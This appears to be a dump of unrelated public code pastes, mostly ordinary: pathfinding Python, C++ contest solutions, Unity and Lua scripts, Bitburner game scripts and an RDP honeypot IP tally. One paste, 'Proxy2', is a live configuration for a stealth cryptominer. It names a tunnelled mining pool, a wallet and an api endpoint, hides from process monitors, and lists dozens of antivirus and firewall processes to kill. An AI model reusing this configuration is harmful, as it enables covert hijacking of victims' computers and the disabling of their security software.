def dijkstra(graph, start_node):
    dist = {node: float('inf') for node in graph.nodes}
    dist[start_node] = 0
    predecessors = {}
    pq = [(0, start_node)]
    while pq:
        current_dist, current_node = heapq.heappop(pq)
        if current_dist > dist[current_node]:
            continue
        for neighbor, edge in graph[current_node].items():
            weight = edge.get('weight', 1)
            new_dist = dist[current_node] + weight
            if new_dist < dist[neighbor]:
                dist[neighbor] = new_dist
                predecessors[neighbor] = current_node
                heapq.heappush(pq, (new_dist, neighbor))
    return dist, predecessors

def evaluation_function(node, target_node, actual_cost, heuristic, weight):
    return actual_cost[node] + weight * heuristic(node, target_node)

def greedy_best_first_search(graph, start_node, target_node, heuristic):
    visited = set()
    pq = [(heuristic(start_node, target_node), start_node)]
    while pq:
        _, current_node = heapq.heappop(pq)
        list1.append(current_node)
        if current_node == target_node:
            return visited
        visited.add(current_node)
        for neighbor in graph[current_node]:
            if neighbor not in visited:
                heapq.heappush(pq, (heuristic(neighbor, target_node), neighbor))
                list1.append(neighbor)
    return visited

def a_star(graph, start_node, target_node, actual_cost, heuristic):
    visited = set()
    pq = [(evaluation_function(start_node, target_node, actual_cost, heuristic, 1), start_node)]
    while pq:
        _, current_node = heapq.heappop(pq)
        list2.append(current_node) 
        if current_node == target_node:
            return visited
        visited.add(current_node)
        for neighbor in graph[current_node]:
            if neighbor not in visited:
                heapq.heappush(pq, (evaluation_function(neighbor, target_node, actual_cost, heuristic, 1), neighbor))
    return visited

def weighted_a_star(graph, start_node, target_node, actual_cost, heuristic, weight):
    visited = set()
    pq = [(evaluation_function(start_node, target_node, actual_cost, heuristic, weight), start_node)]
    while pq:
        _, current_node = heapq.heappop(pq)
        list3.append(current_node) 
        if current_node == target_node:
            return visited
        visited.add(current_node)
        for neighbor in graph[current_node]:
            if neighbor not in visited:
                heapq.heappush(pq, (evaluation_function(neighbor, target_node, actual_cost, heuristic, weight), neighbor))
    return visited

city_name = ""Lake Placid, New York""
graph = ox.graph_from_place(city_name, network_type='all')





# Open the file in read mode
with open(""risk.txt"", ""r"") as f:
    # Iterate over each line in the file
    for line in f:
        # Convert the line to a float and append it to the list
        risk_values.append(float(line.strip()))

# Print the list of risk values


if graph is not None:
    nodes = graph.nodes
    edges = graph.edges
    all_nodes = list(graph.nodes)
    


    # with open(""nodes.txt"", ""w"") as f:
    #     # Iterate over the nodes and write their IDs to the file
    #     for node in nodes:
    #         f.write(str(node) + ""\n"")

    desired_edge_index = 0
    
    # Iterate over the edges and find the edge with the desired index
    # for u, v, data in edges(data=True):
    #     if u == desired_edge_index or v == desired_edge_index:
    #         print(""Edge data:"", data)
    #         break


    print(len(edges))
    # with open(""u_values.txt"", ""w"") as f:  
    #  for u, v, data in edges(data=True):
    #     risk_value = random.uniform(0, 500)
    #     f.write(f""{u} {v} {risk_value}\n"")
    #    # print(f""Edge: {u} -> {v}, Nodes: {u}, {v}"")
        
         
# Open the file in read mode
    with open(""u_values.txt"", ""r"") as f:
        # Iterate over each line in the file
        for line in f:
            # Split the line into three values: node1, node2, and risk value
            node1, node2, risk = line.split()
            node_pairs.append((int(node1), int(node2)))
            # Convert the risk value to float and append it to the list
            risk_values.append(float(risk))

    # Print the list of risk values
#     print(""Risk values length:"", len(risk_values))
#     print(risk_values)
# # Print the length of the node pairs list
#     print(""Node pairs length:"", len(node_pairs))
#     //print(node_pairs)
            

    # start_node = 8922966682
    # target_node = 8922966471



    start_node = random.choice(all_nodes)
    target_node = random.choice(all_nodes)
    start_time = time.time()
    actual_cost, _ = dijkstra(graph, start_node)
    dijkstra_time = time.time() - start_time

    start_time = time.time()
    gbfs_visited = greedy_best_first_search(graph, start_node, target_node, hstd)
    gbfs_time = time.time() - start_time

    start_time = time.time()
    a_star_visited = a_star(graph, start_node, target_node, actual_cost, hstd)
    a_star_time = time.time() - start_time

    start_time = time.time()
    weight = 4
    weighted_a_star_visited = weighted_a_star(graph, start_node, target_node, actual_cost, hstd, weight)
    weighted_a_star_time = time.time() - start_time

    # print(""Start Node:"", start_node)
    # print(""Target Node:"", target_node)

    gbfs_time_ms = gbfs_time * 1000
    a_star_time_ms = a_star_time * 1000
    weighted_a_star_time_ms = weighted_a_star_time * 1000

    results = [
        (""Greedy Best First Search"", len(gbfs_visited)*8, gbfs_time_ms, len(gbfs_visited)),
        (""A*"", len(a_star_visited)*8, a_star_time_ms, len(a_star_visited)),
        (""Weighted A*"", len(weighted_a_star_visited)*100, weighted_a_star_time_ms, len(weighted_a_star_visited))
    ]

    # print(""Size of List 1:"", len(list1))
    # print(""Size of List 2:"", len(list2))
    # print(""Size of List 3:"", len(list3))


    print(tabulate(results, headers=[""Algorithm"", ""Memory (Bytes)"", ""Time (ms)"", ""Search Space""], tablefmt=""grid""))






    ox.plot_graph(ox.project_graph(graph), bgcolor='white', node_size=5, node_color='black', edge_color='#B2BEB5')
    ox.plot_graph(graph.subgraph(list1), node_size=10, node_color='green', edge_linewidth=0.5, edge_color='green')
    ox.plot_graph(graph.subgraph(list2), node_size=10, node_color='blue', edge_linewidth=0.5, edge_color='blue')
    ox.plot_graph(graph.subgraph(list3), node_size=10, node_color='red', edge_linewidth=0.5, edge_color='red')





   
else:
    print(""Error: Failed to retrieve the graph data."")"
Qd0CbeJQ,Proxy2,tarekxx,JSON,Tuesday 20th of February 2024 02:03:52 AM CDT,"{
	""algo"": ""rx/0"",
	""pool"": ""6.tcp.ngrok.io"",
	""port"": 18766,
	""wallet"": ""ZEPHs787ivBXAw2CUxSkCYBDey6SE8bgD7dgWYLS94reSxSkkytU97eTyx33LQGUdbEueLWTHKEdnYwQi5oVNWMQ5ULrHk6i9P9"",
	""password"": ""Hashesh"",
	""ssltls"": true,
	""max-cpu"": 20,
	""idle-wait"": 1,
	""idle-cpu"": 80,
	""stealth-targets"": ""ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,Speccy64.exe"",
	""kill-targets"": ""cpuminer-sse2.exe,afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,advchk.exe,ahnsd.exe,alertsvc.exe,avmaisrv.exe,avsynmgr.exe,bitdefender_p2p_startup.exe,cavrid.exe,cavtray.exe,cmgrdian.exe,freshclam.exe,icepack.exe,mgavrtcl.exe,mghtml.exe,mgui.exe,navapsvc.exe,navapw32.exe,navw32.exe,nsmdtr.exe,ofcdog.exe,pav.exe,savscan.exe,spider.exe,xcommsvr.exe,Procmon64a.exe,Procmon64.exe,Procmon.exe,anvir.exe,MRT.exe,Monitor.exe"",
	""stealth-fullscreen"": true,
	""api-endpoint"": ""https://c5207bfb0223-4425600227365081465.ngrok-free.app/api/endpoint.php""
}"
8eJ5q37N,"СПРИНТ № 5 | Стек, очередь, дек | Урок 3: Очередь и дек",chevengur,C++,Tuesday 20th of February 2024 01:28:16 AM CDT,"#include <stack>
#include <iostream>
#include <algorithm>
#include <vector>
#include <random>
#include <numeric>

using namespace std;

template <typename It>
void PrintRange(It range_begin, It range_end) {
    for (auto it = range_begin; it != range_end; ++it) {
        cout << *it << "" ""s;
    }
    cout << endl;
}

template <typename Type>
class Queue {
public:
    void Push(const Type& element) {
        stack1_.push(element);
    }
    void Pop() {
        MoveElem();
        stack2_.pop();
    }
    Type& Front() {
        MoveElem();
        return stack2_.top();
    }
    uint64_t Size() const {
        return stack1_.size() + stack2_.size();
    }
    bool IsEmpty() const {
        return (stack1_.empty() && stack2_.empty());
    }

private:
    stack<Type> stack1_;
    stack<Type> stack2_;

    void MoveElem() {
        if (stack2_.empty()) {
            while (!stack1_.empty()) {
                stack2_.push(stack1_.top());
                stack1_.pop();
            }
        }
    }
};

int main() {
    setlocale(0, """");
    Queue<int> queue;
    vector<int> values(5);
    // заполняем вектор для тестирования очереди
    iota(values.begin(), values.end(), 1);
    // перемешиваем значения
    random_device rd;
    mt19937 g(rd());
    shuffle(values.begin(), values.end(), g);
    PrintRange(values.begin(), values.end());
    cout << ""Заполняем очередь""s << endl;
    // заполняем очередь и выводим элемент в начале очереди
    for (int i = 0; i < 5; ++i) {
        queue.Push(values[i]);
        cout << ""Вставленный элемент ""s << values[i] << endl;
        cout << ""Первый элемент очереди ""s << queue.Front() << endl;
    }
    cout << ""Вынимаем элементы из очереди""s << endl;
    // выводим элемент в начале очереди и вытаскиваем элементы по одному
    while (!queue.IsEmpty()) {
        // сначала будем проверять начальный элемент, а потом вытаскивать,
        // так как операция Front на пустой очереди не определена
        cout << ""Будем вынимать элемент ""s << queue.Front() << endl;
        queue.Pop();
    }
    return 0;
}"
t2jWRATc,D,Ankit_132,C++,Tuesday 20th of February 2024 01:03:21 AM CDT,"#include <bits/stdc++.h>
typedef long long ll;
#define pb push_back
#define ff first
#define ss second
const int N=2e3+7;
const int mod=1e9+7;

int32_t main() 
{
   ios_base::sync_with_stdio(false);
   cin.tie(0);

   int t;
   cin >> t;
   while(t--)
   {
        int n;
        cin >> n;

        char trump;
        cin >> trump;

        vector<string> cards,trumpCards;
        for(int i=0;i<2*n;i++)
        {
            string card;
            cin >> card;

            if(card[1]==trump)
                trumpCards.pb(card);
            else
                cards.pb(card);
        }

        vector< pair<string,string> > moves;
        for(int i=0;i<cards.size();i++)
        {
            for(int j=0;j<cards.size();j++)
            {
                if(i==j)
                    continue;
                if(cards[i]=="""")
                    continue;
                if(cards[j]=="""")
                    continue;

                if(cards[i][1]==cards[j][1])
                {
                    moves.pb({min(cards[i],cards[j]),max(cards[i],cards[j])});
                    cards[i]="""";
                    cards[j]="""";
                }
            }
        }

        bool ok=true;
        for(int i=0;i<cards.size();i++)
        {
            if(cards[i]!="""")
            {
                if(trumpCards.empty())
                    ok=false;
                else
                {
                    moves.pb({cards[i],trumpCards.back()});
                    trumpCards.pop_back();
                }
            }
        }

        if(trumpCards.size()%2==1)
            ok=false;

        if(!ok)
        {
            cout << ""IMPOSSIBLE\n\n"";
            continue;
        }

        sort(trumpCards.begin(),trumpCards.end());
        for(int i=0;i<trumpCards.size();i++)
        {
            moves.pb({trumpCards[i],trumpCards.back()});
            trumpCards.pop_back();
        }
        
        for(auto ele : moves)
            cout << ele.first << "" "" << ele.second << ""\n"";
        cout << ""\n"";

   }   
}"
7ewKDwjm,E,Ankit_132,C++,Tuesday 20th of February 2024 01:01:17 AM CDT,"#include <bits/stdc++.h>
typedef long long ll;
#define pb push_back
#define ff first
#define ss second
const int N=2e3+7;
const int mod=1e9+7;
using namespace std;  

int32_t main() 
{
   ios_base::sync_with_stdio(false);
   cin.tie(0);

   int t;
   cin >> t;
   while(t--)
   {
        int n;
        string s;
        cin >> n >> s;

        vector<long long> pre(n);
        for(int i=0;i<n;i++)
        {
            pre[i]=s[i]-'0';
            if(i)
                pre[i]=pre[i]+pre[i-1];
        }        

        string ans="""";
        long long remainder=0;
        for(int i=n-1;i>=0;i--)
        {
            long long curr=remainder+pre[i];
            ans+=(char)(curr%10+'0');
            remainder=curr/10;
        }

        while(remainder)
        {
            ans+=(char)(remainder%10+'0');
            remainder=remainder/10;
        }

        while(ans.back()=='0')
            ans.pop_back();
        reverse(ans.begin(),ans.end());

        cout << ans << ""\n"";
   }   
}"
Uxy5VHrR,F,Ankit_132,C++,Tuesday 20th of February 2024 12:58:49 AM CDT,"#include <bits/stdc++.h>
using namespace std;
#define int long long
#define mod 998244353

int32_t main()
{
    ios::sync_with_stdio(0);
    cin.tie(0);

    int t;
    cin>>t;

    while(t--)
    {
        int n,m;
        cin>>n>>m;
        int l[m];
        int r[m];
        for(int i=0;i<m;i++){cin>>l[i]>>r[i];l[i]--;r[i]--;}

        vector<int> opens[n+1];
        vector<int> closes[n+1];

        for(int i=0;i<m;i++)
        {
            opens[l[i]].push_back(i);
            closes[r[i]].push_back(i);
        }

        set<pair<int,int>> s; //(close,i)

        int dp[n+1];
        dp[n]=0;
        for(int i=n-1;i>=0;i--)
        {
            for(auto x:closes[i]){s.insert({r[x],x});}
            dp[i]=dp[i+1];
            if(!s.empty())
            {
                dp[i]=max(dp[i],(int)(s.size())+dp[(*(s.rbegin())).first+1]);
            }

            for(auto x:opens[i]){s.erase({r[x],x});}

        }
        cout<<dp[0]<<""\n"";
    }

  





   return 0;    
}

"
ub0sVmXV,C,Ankit_132,C++,Tuesday 20th of February 2024 12:56:14 AM CDT,"#include <bits/stdc++.h>

using namespace std;

int main() {
    int t;
    cin>>t;
    
    while(t--){
        int n, m;
        cin>>n>>m;
        
        deque<int> a;
        for(int i=0; i<n; i++)
        {
            int x;
            cin>>x;
            a.push_back(x);
        }
        
        string s;
        cin>>s;
        
        vector<int> v;
        
        for(int i=0; i<n; i++)
        {
            if(s[i] == 'L')
            {
                v.push_back(a.front());
                a.pop_front();
            }
            else
            {
                v.push_back(a.back());
                a.pop_back();
            }
        }
        
        reverse(v.begin(), v.end());
        
        vector<int> ans;
        int mul = 1;
        
        for(auto e: v)
        {
            mul *= e;
            mul %= m;
            ans.push_back(mul);
        }
        
        reverse(ans.begin(), ans.end());
        
        for(auto e: ans)
            cout<<e<<"" "";
        cout<<""\n"";
    }
}"
ujGSh3UQ,B,Ankit_132,C++,Tuesday 20th of February 2024 12:55:30 AM CDT,"#include <bits/stdc++.h>

using namespace std;

int main() {
    int t;
    cin>>t;
    
    while(t--){
        int n;
        cin>>n;
        
        vector<int> a(n);
        for(auto &e: a)     cin>>e;
        
        long long int ans = 0;
        
        for(auto e: a)
            ans = ((ans+e)/e)*e;
            
        cout<<ans<<""\n"";
    }
}"
bedsGd5B,A,Ankit_132,C++,Tuesday 20th of February 2024 12:54:47 AM CDT,"#include <bits/stdc++.h>

using namespace std;

int main() {
    int t;
    cin>>t;
    
    while(t--){
        int n;
        string s;
        cin>>n>>s;
        
        int ans = 0;
        
        for(int i=0; i<n; i++)
        {
            if(i<n-1 && s[i]=='*' && s[i+1]=='*')     break;
            
            ans += (s[i] == '@');
        }
        
        cout<<ans<<""\n"";
    }
}"
dCXSqSq5,UpdatedLevelSetup,noobHasan,C#,Tuesday 20th of February 2024 12:46:35 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using DG.Tweening;
using UnityEngine.UI;
using TMPro;

public class LevelSetup : MonoBehaviour {
    public static LevelSetup Instance;

    public List<GameObject> allBallsArray = new List<GameObject>();
    public LevelData levelData;

    #region tutorialVariables
    [Space(10)]
    [Header(""Obstacle Tutorial"")]
    [HideInInspector]public GameObject obstacleTutorialPanel;
    [HideInInspector] public SpriteRenderer obstacleTutorialHand;
    [HideInInspector] public SpriteRenderer textPanelArrow;
    [HideInInspector] public SpriteRenderer textPanelImage;
    [HideInInspector] public TMP_Text tapHereText;
    [HideInInspector] public TMP_Text textPanelText;
    #endregion

    private void Awake()
    {
        Instance = this;
    }

    private void Start()
    {
        ShowTutorial();
        SetupColors();

        Dictionary<BallColor, int> ballColorCounts = GetBallColorCounts();

        foreach (var entry in ballColorCounts)
        {
            Debug.Log($""Ball Color: {entry.Key}, Count: {entry.Value}"");
        }
    }

    private void SetupColors()
    {
        List<BallColor> availableBallColors = GetAllBallColors();
        ShuffleColors(availableBallColors);

        Dictionary<BallColor, List<Player>> colorGroups = GetColorGroups();

        foreach (var colorGroup in colorGroups)
        {
            if (availableBallColors.Count > 0)
            {
                BallColor randomBallColor = availableBallColors[0];
                Material ballMaterial = levelData.GetMaterial(randomBallColor);

                foreach (Player playerScript in colorGroup.Value)
                {
                    playerScript.SetupColors(randomBallColor, ballMaterial);
                }

                availableBallColors.RemoveAt(0); // Remove the used color
            }
        }
    }

    private Dictionary<BallColor, List<Player>> GetColorGroups()
    {
        Dictionary<BallColor, List<Player>> colorGroups = new Dictionary<BallColor, List<Player>>();

        foreach (GameObject ballObject in allBallsArray)
        {
            Player playerScript = ballObject.GetComponentInChildren<Player>();
            if (playerScript != null)
            {
                BallColor ballColor = playerScript.ballColor;

                if (!colorGroups.ContainsKey(ballColor))
                {
                    colorGroups[ballColor] = new List<Player>();
                }
                colorGroups[ballColor].Add(playerScript);
            }
        }

        return colorGroups;
    }



    private List<BallColor> GetAllBallColors()
    {
        List<BallColor> ballColors = new List<BallColor>();

        foreach (GameObject ballObject in allBallsArray)
        {
            Player playerScript = ballObject.GetComponentInChildren<Player>();
            if (playerScript != null)
            {
                ballColors.Add(playerScript.ballColor);
            }
        }
        return ballColors;
    }

    private void ShuffleColors(List<BallColor> colors)
    {
        for (int i = colors.Count - 1; i > 0; i--)
        {
            int j = Random.Range(0, i + 1);
            BallColor temp = colors[i];
            colors[i] = colors[j];
            colors[j] = temp;
        }
    }

    public void ShowTutorial()
    {
        int actualLevelIndex = LevelLoader.Instance.Actual_Level_Index() - 1;

        if (actualLevelIndex == 10 && PlayerPrefs.GetInt(""ObstacleTutorial"") == 0)
        {
            ShowObstacleTutorial();
        }
        else
        {
            if (obstacleTutorialPanel != null)
            {
                obstacleTutorialPanel.SetActive(false);
            }
        }
    }

    private Dictionary<BallColor, int> GetBallColorCounts() {
        Dictionary<BallColor, int> ballColorCounts = new Dictionary<BallColor, int>();

        foreach (GameObject ballObject in allBallsArray)
        {
            Player playerScript = ballObject.GetComponentInChildren<Player>();
            if (playerScript != null)
            {
                BallColor ballColor = playerScript.ballColor;

                if (!ballColorCounts.ContainsKey(ballColor))
                {
                    ballColorCounts[ballColor] = 0;
                }
                ballColorCounts[ballColor]++;
            }
        }

        return ballColorCounts;
    }

    #region tutorial

    public void ShowObstacleTutorial()
    {
        obstacleTutorialPanel.SetActive(true);
    }

    public void HideObstacleTutorial()
    {
        PlayerPrefs.SetInt(""ObstacleTutorial"", 1);
        obstacleTutorialHand.DOFade(0, .25f);
        tapHereText.DOFade(0, .25f);
        textPanelText.DOFade(0, .25f);
        textPanelImage.DOFade(0, .25f);
        textPanelArrow.DOFade(0, .25f);
    }
    #endregion

}
"
QCisvzRV,gimmie-money,drakkillen,JavaScript,Monday 19th of February 2024 11:39:40 PM CDT,"/** @param {NS} ns */
export async function main(ns) {
var target = ns.args[0];
var securityThresh = ns.getServerMinSecurityLevel(target) + 5;
var moneyThresh = ns.getServerMaxMoney(target) * 0.75;

  while(true){
    if(ns.getServerSecurityLevel(target) > securityThresh){
      await ns.weaken(target)
    }
    else if (ns.getServerMoneyAvailable(target) < moneyThresh){
      await ns.grow(target);
    }
    else{
      await ns.hack(target)
    }
  }
}"
7z5fL9nW,auto-deploy,drakkillen,JavaScript,Monday 19th of February 2024 11:38:56 PM CDT,"/** @param {NS} ns */
export async function main(ns) {
  var target = ns.args[0]
  var homeServer = ""home""
  var cracks ={
    ""BruteSSH.exe"": ns.brutessh,
    ""FTPCrack.exe"": ns.ftpcrack,
    ""relaySMTP.exe"": ns.relaysmtp,
    ""HTTPWorm.exe"": ns.httpworm,
    ""SQLInject.exe"": ns.sqlinject
  };
  var virus = ""gimmie-money.js""
  var virusRam = ns.getScriptRam(virus)
  function getNumCracks(){
    return Object.keys(cracks).filter(function(file){
        return ns.fileExists(file,homeServer);
    }).length;
  }
  function penetrate(server) {
    ns.print(""Penetrating"" + server);
    for(var file of Object.keys(cracks)){
      if(ns.fileExists(file, homeserver)){
        var runScript = cracks[file];
        runScript(server)
      }
    }
  }
  async function copyAndRunVirus(server){
    ns.print(""Copying virus to server: ""+ server)
      await ns.scp(virus, server)

    if(!ns.hasRootAccess(server)){
      var requiredPorts = ns.getServerNumPortsRequired(server)
      if(requiredPorts > 0){
        penetrate(server)
      }
      ns.print(""Gaining root access on "" + server)
      ns.nuke(server)
    }

    if(ns.scriptRunning(virus, server)){
      ns.scriptKill(virus, server)
    }
    var maxThreads = Math.floor(ns.getServerMaxRam(server) / virusRam)
    
    ns.exec(virus, server, maxThreads, target)
  }

  function getNetworkNodes(){
    ns.print(""Retrieving all nodes in the network"")
    var visited = {}
    var stack = []
    var origin = ns.getHostname()
    stack.push(origin)

    while(stack.length > 0){
      var node = stack.pop()
      if(!visited[node]){
        visited[node] = node 
        var neighbours = ns.scan(node)
        for(var i = 0; i < neighbours.length; i++){
          var child = neighbours[i]
            if(visited[child]){
              continue
          }
          stack.push(child)
        }
      }
    }
    return Object.keys(visited)
  }
  function canHack(server){
    var numCracks = getNumCracks()
    var reqPorts = ns.getServerNumPortsRequired(server)
    var ramAvail = ns.getServerMaxRam(server)
    return numCracks >= reqPorts && ramAvail > virusRam
  }
  function getTargetServers(){
    var networkNodes = getNetworkNodes()
    var targets = networkNodes.filter(function (node){return canHack(node)})
    var i = 0
    var serverPrefix =""pserv-""
    while(ns.serverExists(serverPrefix + i)){
      targets.push(serverPrefix + i)
      ++i
    }
    return targets
  }
  async function deployHacks(targets){
    ns.tprint(""Gonna deploy virus to these servers "" + targets)
    for(var serv of targets){
      await copyAndRunVirus(serv)
    }
  }
  var curTargets = []
  var waitTime = 2000
  while(true){
    var newTargets = getTargetServers()
    if(newTargets.length !== curTargets.length){
      await deployHacks(newTargets)
      curTargets = newTargets
    }
    await ns.sleep(waitTime)
  }
}"
PftgKFzV,Untitled,artemsemkin,PHP,Monday 19th of February 2024 11:04:34 PM CDT,"<?php

// Find and remove this code in these templates:
// /wp-content/themes/kinsey/template-parts/masthead/masthead-elementor-behind.php
// /wp-content/themes/kinsey/template-parts/masthead/masthead-elementor-beneath.php
// /wp-content/themes/kinsey/template-parts/masthead/masthead-elementor-fullscreen.php
// /wp-content/themes/kinsey/template-parts/bottom-navigation/bottom-navigation-auto-scroll.php

$heading_attributes = arts_get_split_text_attributes(
  $heading_attributes,
  array(
    'by'        => 'lines,words,chars',
    'set'       => $page_masthead_animation_enabled ? 'chars' : false,
    'overflow'  => 'lines',
    'animation' => false,
  )
);"
0dZr4kGA,Untitled,hmbashar,CSS,Monday 19th of February 2024 10:43:32 PM CDT,"
/* ---------------------------------------------
* PopUp
* --------------------------------------------- */
.abcbiz-popup-trigger {
    cursor: pointer;
}
.abcbiz-popup-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 9999;
    justify-content: center;
    align-items: center;
}

.abcbiz-popup {
    position: relative;
    border-radius: 5px;
    padding: 20px;
    max-width: 600px; 
    width: 90%; 
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); 
    background: #fff;
}

.abcbiz-popup-close {
    position: absolute;
    top: -25px;
    right: -20px;
    cursor: pointer;
    font-size: 24px;
    color: #333;
}

.abcbiz-popup iframe {
    width: 100%; 
    height: 50vh; 
}
.abcbiz-popup-close i {
    font-size: 24px;
    color: #333;
    background-color: #f0f0f0;
    padding: 10px;
    border-radius: 100%;
    width: 30px;
    height: 30px;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
}"
f6MeWCtt,Sort,Alexr360,Lua,Monday 19th of February 2024 09:29:27 PM CDT,"-- Function to count the total number of items in the chest
local function countItems(chest)
    local itemCount = {}
    for slot = 1, chest.size() do
        local stack = chest.getItemDetail(slot)
        if stack then
            local itemName = stack.name
            itemCount[itemName] = (itemCount[itemName] or 0) + stack.count
        end
    end
    return itemCount
end

-- Function to compare two item counts
local function compareItemCount(itemCount1, itemCount2)
    for itemName, count in pairs(itemCount1) do
        if itemCount2[itemName] and itemCount2[itemName] > count then
            return true -- itemCount2 has more of this item
        end
    end
    return false
end

-- Function to move items from one slot to another within the same chest
local function moveItems(chest, slot1, slot2)
    chest.pushItems(peripheral.getName(chest), slot1, 1, slot2)
end

-- Function to sort the items in the chest
local function sortChest(chest)
    local sorted = false
    while not sorted do
        sorted = true
        for slot = 1, chest.size() - 1 do
            local stack1 = chest.getItemDetail(slot)
            local stack2 = chest.getItemDetail(slot + 1)
            if stack1 and stack2 and compareItemCount({[stack1.name] = stack1.count}, {[stack2.name] = stack2.count}) then
                moveItems(chest, slot, slot + 1)
                sorted = false
            end
        end
    end
end

-- Main function
local function main()
    local chest = peripheral.find(""minecraft:chest"")
    if chest then
        sortChest(chest)
        print(""Chest sorted successfully!"")
    else
        print(""No chest detected."")
    end
end

-- Call the main function
main()
"
izsB1RPi,Mad,Unknown_No_1,PHP,Monday 19th of February 2024 09:04:40 PM CDT,FeedbackBhejoWarnaKeyExpired
ynwh3iMJ,Discord Attachment Copier,TurretBot,JavaScript,Monday 19th of February 2024 08:53:06 PM CDT,"// ==UserScript==
// @name         Discord Attachment Copier
// @version      1.3
// @description  try to take over the world!
// @author       TurretBot
// @match        https://discord.com/channels/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=discord.com
// @grant        none
// ==/UserScript==

(function() {
    'use strict';
    function getsub(id) {
        var attatchments="""",att=document.getElementById(""message-accessories-""+id).querySelectorAll(""a"");
        for (var i=0;i<att.length;i++) {
            if ((att[i]+"""").includes(""cdn.discord"")) {attatchments=attatchments.concat(att[i]+""\n"")};
        }
        //clear dupes (audio has two hrefs w same link)
        attatchments=attatchments.split(""\n"").filter((item, i, allItems) => {return i === allItems.indexOf(item);}).join(""\n"");
        return attatchments+document.getElementById(""message-content-""+id).innerText;
    };

    function ButtonClickAction (zEvent) {
        zEvent.target.innerHTML=getsub(zEvent.target.id);
    }

    var mo = new MutationObserver(function(muts) {
        muts.forEach(function(mut) {
            Array.prototype.forEach.call(mut.addedNodes, function(node) {
                if (node instanceof HTMLElement) {
                    Array.prototype.forEach.call(node.querySelectorAll('time'), function(img) {
                        //https://stackoverflow.com/questions/6480082/add-a-javascript-button-using-greasemonkey-or-tampermonkey
                        var zNode=document.createElement('textarea');
                        zNode.rows=1
                        zNode.placeholder=""Click for submission text""
                        zNode.id=img.id.replace(""message-timestamp-"","""");
                        zNode.addEventListener(
                            ""click"", ButtonClickAction, false
                        );
                        img.appendChild(zNode);
                    });
                }
            });
        });
    });
    mo.observe(document.body, {childList: true, subtree: true});
    // Your code here...
})();"
5yySJFhX,Untitled,Tkap1,C++,Monday 19th of February 2024 08:43:36 PM CDT,"#include <iostream>
#include <stdint.h>
using namespace std;
typedef uint32_t u32;

struct s_connection {
	u32 a;
	u32 b;
};

static bool walked[100000];
static u32 connection_count = 0;
static u32 added_count = 0;
static s_connection connections[200000];
static s_connection added[200000];
static u32 cities, roads;

int main() {

	cin >> cities >> roads;
	for(u32 i = 0; i < roads; i++) {
		u32 a, b;
		cin >> a >> b;
		connections[connection_count++] = {a, b};
	}

	walked[1] = true;
	for(u32 city_i = 1; city_i < cities; city_i++) {
		u32 curr = city_i;
		u32 target = city_i + 1;
		if(walked[target]) {
			continue;
		}

		bool reset_loop = true;
		while(reset_loop) {
			reset_loop = false;
			for(int connection_i = 0; connection_i < (int)connection_count; connection_i++) {
				s_connection c = connections[connection_i];
				if(walked[c.a] && !walked[c.b]) {
					walked[c.b] = true;
					reset_loop = true;
				}
				else if(walked[c.b] && !walked[c.a]) {
					walked[c.a] = true;
					reset_loop = true;
				}
				if(walked[c.a] && walked[c.b]) {
					connections[connection_i--] = connections[--connection_count];
				}
				if(walked[target]) { break; }
			}
		}
		if(!walked[target]) {
			connections[connection_count++] = {curr, target};
			added[added_count++] = {curr, target};
			walked[target] = true;
		}
	}

	cout << added_count << endl;
	for(u32 i = 0; i < added_count; i++) {
		cout << added[i].a << "" "" << added[i].b << endl;
	}
	return 0;
}
"
pGKxDxhp,邀您一起看：一口气看完【北派盗墓笔记】更新最全版本，真实故事改编！,xiaomianao666,JavaScript,Monday 19th of February 2024 08:40:16 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥一口气看完【北派盗墓笔记】更新最全版本，真实故事改编！@@
peJsyWrN,task3recursion,psychotrance,Java,Monday 19th of February 2024 07:17:15 PM CDT,"import java.util.Scanner;
/*
Вычислите факториал введенного с клавиатуры целого числа, используя 
рекурсивный алгоритм.
 */


public class task3 {
    public static void main(String[] args) {
        Scanner in = new Scanner(System.in);

        System.out.println(findFactorial(requireNum(in)));
    }

    static int requireNum(Scanner in) {
        int num = in.nextInt();
        return num;
    }

    static int findFactorial(int x) {
        if (x == 1) {
            return 1;
        }
        return x * findFactorial(x - 1);
    }
}"
WCWfzWjt,2024-02-19_stats.json,rdp_snitch,JSON,Monday 19th of February 2024 06:18:03 PM CDT,"{
  ""ip"": {
    ""15.235.189.147"": 3,
    ""167.94.138.125"": 3,
    ""205.210.31.104"": 9,
    ""87.251.75.145"": 12,
    ""194.165.16.10"": 6,
    ""45.137.201.204"": 6,
    ""212.70.149.142"": 12,
    ""58.218.204.183"": 9,
    ""45.227.254.55"": 6,
    ""71.6.134.231"": 30,
    ""185.170.144.3"": 3,
    ""173.239.214.30"": 3,
    ""216.24.210.224"": 3,
    ""36.91.222.100"": 6,
    ""50.116.29.148"": 12,
    ""206.189.79.124"": 3,
    ""172.233.185.111"": 3,
    ""205.210.31.234"": 9,
    ""172.235.28.154"": 3,
    ""87.251.75.179"": 6,
    ""120.240.145.8"": 3,
    ""103.192.198.60"": 6,
    ""210.3.96.246"": 9,
    ""152.32.228.20"": 3,
    ""14.232.77.71"": 15,
    ""205.210.31.97"": 9,
